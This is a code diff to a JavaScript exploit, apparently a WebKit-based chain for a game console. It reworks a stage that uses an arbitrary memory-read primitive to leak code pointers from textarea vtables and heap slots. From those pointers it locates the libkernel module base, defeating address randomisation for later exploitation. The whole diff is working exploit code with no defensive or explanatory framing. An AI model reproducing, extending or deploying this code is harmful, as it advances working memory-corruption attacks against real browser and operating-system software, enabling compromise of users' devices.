@@ -606,7 +606,7 @@ const IMPORT_PLT_CANDS = [
 function lkFromFnPtr(p, fnPtr, off, iatRva) {
     if (!fnPtr) return null;
 
-    const walked = findModuleBaseBackward(p, fnPtr, 512);
+    const walked = findModuleBaseBackward(p, fnPtr, 128);
     if (walked && looksLikeLibkernelModule(p, walked))
         return { lk: walked, iatRva, errorFn: fnPtr, via: "elf-walk" };
 
@@ -643,7 +643,7 @@ function safeVerifyGotSlot(p, webkitBase, off, rva) {
     if (!fnPtr) return null;
     if (plausibleExtPtr(fnPtr, base, off))
         return lkFromFnPtr(p, fnPtr, off, rva);
-    const walked = findModuleBaseBackward(p, fnPtr, 512);
+    const walked = findModuleBaseBackward(p, fnPtr, 128);
     if (walked && looksLikeLibkernelModule(p, walked))
         return { lk: walked, iatRva: rva, errorFn: fnPtr, via: "got-walk" };
     return null;
@@ -975,7 +975,7 @@ function scanLkPrologueRingChunk(p, off, sub, anchors) {
     };
 }
 
-/** Scan leakval slots for external code pointers (textarea, expm1). */
+/** Scan leakval + PSFree textarea vtable entries (heap/code ptrs only — OOM-safe). */
 function scanLeakExtPtrChunk(p, webkitBase, off, state, retain) {
     if (!state) {
         const targets = [];
@@ -992,42 +992,108 @@ function scanLeakExtPtrChunk(p, webkitBase, off, state, retain) {
         } catch (_) { }
         if (!targets.length)
             return { done: true, lk: null, state: null, phase: "leak-empty" };
-        state = { targets, tIdx: 0, slotOff: 0, tried: 0 };
+        state = {
+            targets,
+            tIdx: 0,
+            slotOff: 0,
+            tried: 0,
+            stage: "psfree",
+            vtIdx: 0,
+            extSeen: {},
+            extList: [],
+        };
         return { done: false, state, phase: "leak-start", targets: targets.length };
     }
 
-    const SLOT_MAX = 0x100;
-    let batch = 0;
-    while (state.tIdx < state.targets.length && batch < 4) {
-        const t = state.targets[state.tIdx];
-        while (state.slotOff <= SLOT_MAX && batch < 4) {
-            const offSlot = state.slotOff;
-            state.slotOff += 8;
-            state.tried++;
-            batch++;
-            const fnPtr = read8p(p, t.cell.add32(offSlot));
-            if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) continue;
-            const hit = lkFromFnPtr(p, fnPtr, off, null);
-            if (hit) {
-                saveLibkernelSession(hit.lk, hit.iatRva);
-                return {
-                    done: true,
-                    lk: hit.lk,
-                    iatRva: hit.iatRva,
-                    source: "leak/" + t.label + "+0x" + offSlot.toString(16),
-                    state,
-                    phase: "leak-hit",
-                    tried: state.tried,
-                };
-            }
-        }
-        state.tIdx++;
-        state.slotOff = 0;
+    function noteExt(fnPtr, source) {
+        if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) return null;
+        const key = String(fnPtr);
+        if (state.extSeen[key]) return null;
+        state.extSeen[key] = source;
+        state.tried++;
+        if (state.extList.length < 16)
+            state.extList.push({ ptr: key, source });
+        const hit = lkFromFnPtr(p, fnPtr, off, null);
+        if (!hit) return null;
+        saveLibkernelSession(hit.lk, hit.iatRva);
+        return {
+            done: true,
+            lk: hit.lk,
+            iatRva: hit.iatRva,
+            source: source + "/" + hit.via,
+            state,
+            phase: "leak-hit",
+            tried: state.tried,
+        };
     }
 
-    if (state.tIdx >= state.targets.length)
-        return { done: true, lk: null, state, phase: "leak-miss", tried: state.tried };
-    return { done: false, state, phase: "leak", tried: state.tried, target: state.tIdx };
+    let batch = 0;
+    while (batch < 4) {
+        if (state.stage === "psfree") {
+            const ta = state.targets[0];
+            state.webcore = read8p(p, ta.cell.add32(0x18));
+            state.vtable = state.webcore ? read8p(p, state.webcore) : null;
+            state.stage = state.vtable ? "vtable" : "heap";
+            state.vtIdx = 0;
+            batch++;
+            continue;
+        }
+        if (state.stage === "vtable") {
+            if (state.vtIdx >= 48) {
+                state.stage = "heap";
+                state.tIdx = 0;
+                state.slotOff = 0;
+                continue;
+            }
+            const idx = state.vtIdx++;
+            const fnPtr = read8p(p, state.vtable.add32(idx * 8));
+            batch++;
+            const hit = noteExt(fnPtr, "vtable[" + idx + "]");
+            if (hit) return hit;
+            continue;
+        }
+        if (state.stage === "heap") {
+            const SLOT_MAX = 0x100;
+            while (state.tIdx < state.targets.length && batch < 4) {
+                const t = state.targets[state.tIdx];
+                while (state.slotOff <= SLOT_MAX && batch < 4) {
+                    const offSlot = state.slotOff;
+                    state.slotOff += 8;
+                    batch++;
+                    const fnPtr = read8p(p, t.cell.add32(offSlot));
+                    const hit = noteExt(fnPtr, t.label + "+0x" + offSlot.toString(16));
+                    if (hit) return hit;
+                }
+                state.tIdx++;
+                state.slotOff = 0;
+            }
+            if (state.tIdx >= state.targets.length) {
+                return {
+                    done: true,
+                    lk: null,
+                    state,
+                    phase: "leak-miss",
+                    tried: state.tried,
+                    extList: state.extList,
+                };
+            }
+            return {
+                done: false,
+                state,
+                phase: "leak",
+                tried: state.tried,
+                target: state.tIdx,
+            };
+        }
+        break;
+    }
+    return {
+        done: false,
+        state,
+        phase: "leak",
+        tried: state.tried,
+        target: state.tIdx || 0,
+    };
 }
 
 /** Log-only — never reads (blind module probes OOM on 13.52). */
@@ -1170,7 +1236,7 @@ function scanMappedExtPtrChunk(p, webkitBase, off, state) {
                 tried: state.tried,
             };
         }
-        const walked = findModuleBaseBackward(p, fnPtr, 512);
+        const walked = findModuleBaseBackward(p, fnPtr, 128);
         if (walked && looksLikeLibkernelModule(p, walked)) {
             saveLibkernelSession(walked, rva);
             return {
